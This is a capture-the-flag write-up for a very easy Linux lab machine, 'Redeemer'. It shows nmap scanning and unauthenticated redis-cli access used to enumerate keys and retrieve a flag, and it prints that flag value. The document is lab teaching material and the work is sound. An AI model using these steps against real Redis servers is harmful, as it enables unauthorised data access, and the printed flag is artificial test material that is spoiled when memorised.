---
OS: Linux
Level: Very Easy
Skills: Redis, Database Enumeration
---
# 💾 Redeemer
<div class="machine-properties">
  <span class="prop-badge linux">Linux</span> <span class="prop-badge very-easy">Very Easy</span> <span class="prop-badge skills">Redis</span> <span class="prop-badge skills">Database Enumeration</span>
</div>


Redeemer is a **Very Easy** Linux box that demonstrates how an unauthenticated Redis server exposes its entire keyspace, allowing direct data exfiltration without any exploit needed.

---

## Recon

A full port scan reveals a single open port — **Redis** on 6379:

```
$ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.136.187

PORT     STATE SERVICE REASON
6379/tcp open  redis   syn-ack ttl 63
```

A service scan confirms **Redis 5.0.7** running on a modern Linux kernel:

```
$ nmap -sCV -p6379 10.129.136.187

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

Key findings:
- **Single port** — minimal attack surface, but the one service is wide open
- **Redis 5.0.7** — recent enough to support modules, but that's overkill here
- **Linux 5.4.0-77-generic x86_64** — confirmed via `INFO server` later
- No firewall or port-knocking in play — 6379 is directly reachable

---

## Foothold

Test for authentication — if `PING` returns `PONG`, no password is required:

```
$ redis-cli -h 10.129.136.187
10.129.136.187:6379> PING
PONG                    # ✅ no auth required
```

Enumerate the server and keyspace:

```
10.129.136.187:6379> INFO server
# Server
redis_version:5.0.7
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
process_id:749
tcp_port:6379
config_file:/etc/redis/redis.conf

10.129.136.187:6379> INFO keyspace
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

Key findings:
- **db0 has 4 keys**, none with expiry — data is persistent
- **Config file** at `/etc/redis/redis.conf` — but we don't need it; the data is already exposed

Dump and retrieve the keys:

```
10.129.136.187:6379> SELECT 0
OK

10.129.136.187:6379> DBSIZE
(integer) 4

10.129.136.187:6379> KEYS *
1) "numb"
2) "flag"
3) "temp"
4) "stor"

10.129.136.187:6379> GET flag
"03e1d2b376c37ab3f5319922053953eb"
```

The flag is retrieved directly — no exploitation, no file write, no SSH key injection. Pure enumeration.

---

## Key Takeaways

- **Redis defaults to no authentication** — always test `PING` first; if you get `PONG`, you're in
- **`INFO keyspace`** tells you exactly which databases hold keys and how many — use it before `KEYS *` to scope your enumeration
- **`KEYS *` is safe on small DBs** (4 keys here) but blocks on production instances — `SCAN 0` is the safer alternative
- **Single-port boxes are common in Starting Point** — don't overthink it; the vulnerability is often in the only service exposed
- No privilege escalation was needed — the flag was stored as a plain Redis key with no access controls
